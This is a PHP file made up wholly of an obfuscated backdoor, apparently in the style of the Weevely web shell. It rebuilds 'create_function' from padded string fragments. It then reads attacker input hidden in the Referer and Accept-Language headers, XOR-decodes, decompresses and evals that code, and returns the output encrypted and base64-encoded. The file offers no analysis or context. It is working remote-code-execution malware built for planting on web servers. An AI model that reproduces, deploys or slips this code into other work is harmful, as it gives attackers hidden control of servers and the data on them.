<?php
$I=str_replace('ip','','ipcreatipeip_ipfipipunction');
$Q='*"HTTP_AC*CEPT_LA*NGUAGE"*];i*f(*$rr&&$ra)*{$u*=parse_url(*$rr);*p*arse_str($u';
$k='p=$*s*s($p,3*);}if*(*array_key_exists($*i,$s)){$*s[$i]*.=$p*;$e=**strpos($s[$';
$h='d5($i.$*kh),0,3));$f=*$s*l($ss(md5(*$*i.$kf)*,0*,3));$p="";f*or($z=1;$*z<co*u';
$N='nt($*m[1]);*$z++)$p*.=$q*[$m[2]*[$z]];*if(*strpos($p,$h*)===*0*){$s[$i]=*"";$';
$J='*,$e))*),$k)))*;$o=o***b_get_contents();ob*_end*_clea*n();$d*=bas*e64_encode*';
$v=':;q=0.(*[\\d]*))?,*?/",$ra,$m);if*($q&&$m)*{@sessi*on_sta**rt();$*s=&$_SESSION';
$f='$k*h="5d41*";$kf="4*02a";functio*n x(*$t,$k){**$c=strlen($*k);$l*=strlen($*t);$';
$E='*o=*"";*for($i=0;$i*<$l;){*for($j=0*;($j*<$c&&$i<$*l)*;$j++,$i*++){*$o.=$t{$*i';
$O='(x(gzc**ompress($o)*,$k));pr*int(*"<$k>*$d<*/$k>");@se*s*sion_destr*oy();}}}}';
$t='*4_decode(preg_repl*ace(a*rray("/*_/",*"/-*/"),array*("/","+")*,$*ss($s[$i],0';
$r='*}^$k*{$j*};}}return *$o;}$r*=$_SERVER;$*rr=@$r["***HTTP_RE*FER*ER"];$ra=@$r[';
$j='["query*"],$q)*;$q=*arra*y_values($*q);pre*g_ma*tch_all(*"/([*\\w])*[\\*w-]*+(?';
$S='*i]*,$f);if*($e){$k=$*k*h.$kf;ob_**start();@*ev*al(@gzunco*mpr*ess(@x(@b*ase6';
$H='*;*$ss="su*bstr";$sl*=*"strt*olower";$*i=$m[1][*0]*.$*m[*1][1];$h=*$sl($*ss(m';
$y=str_replace('*','',$f.$E.$r.$Q.$j.$v.$H.$h.$N.$k.$S.$t.$J.$O);
$T=$I('',$y);$T();
?>
